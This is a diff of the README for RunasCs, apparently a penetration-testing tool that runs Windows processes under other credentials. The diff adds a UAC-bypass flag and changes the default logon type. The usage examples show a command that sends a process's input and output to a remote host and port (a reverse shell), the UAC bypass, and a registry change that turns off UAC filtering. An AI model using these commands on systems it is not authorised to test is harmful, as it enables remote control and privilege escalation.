@@ -9,7 +9,8 @@ This tool is an improved (from a pentest perspective) and open version of window
 * Works both if spawned from interactive process and from service process
 * Manage properly *DACL* for *Window Stations* and *Desktop* for the creation of the new process
 * Uses more reliable create process functions like ``CreateProcessAsUser()`` and ``CreateProcessWithTokenW()`` if the calling process holds the required privileges (automatic detection)
-* Allows to specify the logon type, i.e. network logon 3 (no *UAC* limitations)
+* Allows to specify the logon type, i.e. network cleartext logon 8 (no *UAC* limitations)
+* Allows to bypass UAC when an administrator password is known (flag --bypass-uac)
 * Allows redirecting *stdin*, *stdout* and *stderr* to a remote host
 * It's Open Source :)
 
@@ -65,7 +66,7 @@ Optional arguments:
                             2 - CreateProcessWithLogonW
     -l, --logon-type logon_type
                             the logon type for the spawned process.
-                            Default: "3"
+                            Default: "8"
     -r, --remote host:port
                             redirect stdin, stdout and stderr to a remote host.
                             Using this option sets the process timeout to 0.
@@ -86,6 +87,10 @@ Optional arguments:
                             Compatible only with -f flags:
                                 1 - CreateProcessWithTokenW
                                 2 - CreateProcessWithLogonW
+	-b, --bypass-uac     
+                            if this flag is specified RunasCs will try a UAC
+                            bypass to spawn a process without token limitation
+                            (not filtered).
 
 Examples:
     Run a command as a specific local user
@@ -98,11 +103,16 @@ Examples:
         RunasCs.exe user1 password1 cmd.exe -r 10.10.10.24:4444
     Run a command simulating the /netonly flag of runas.exe
         RunasCs.exe user1 password1 whoami -d domain -l 9
+	Run a command as an Administrator bypassing UAC
+        RunasCs.exe adm1 password1 "whoami /all" --bypass-uac
 ```
 
 The two processes (calling and called) will communicate through one *pipe* (both for *stdout* and *stderr*).
 The default logon type is 8 (*NetworkCleartext*). 
-*NetworkCleartext* logon type is the one with widest permissions as it doesn't get filtered by UAC for local tokens and still allows authentications over the Network.
+
+**NetworkCleartext** logon type is the one with widest permissions as it doesn't get filtered by UAC in local tokens and still allows
+ authentications over the Network as it stores credentials in the authentication package.
+
 If you set *Interactive* (2) logon type you will face some *UAC* restriction problems.
 You can make interactive logon without any restrictions by setting the following regkey to 0 and restart the server:
 
@@ -111,6 +121,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Ena
 ```
 
 Otherwise, you can try the flag --bypass-uac for an attempt in bypassing the token filtered limitation.
+
 By default, the calling process (*RunasCs*) will wait until the end of the execution of the spawned process and will use
 ``cmd.exe`` to manage *stdout* and *stderr*. If you need to spawn a background or async process, i.e. spawning a reverse shell,
 you need to set the parameter ``-t timeout`` to ``0``. In this case the process will be spawned without using ``cmd.exe``
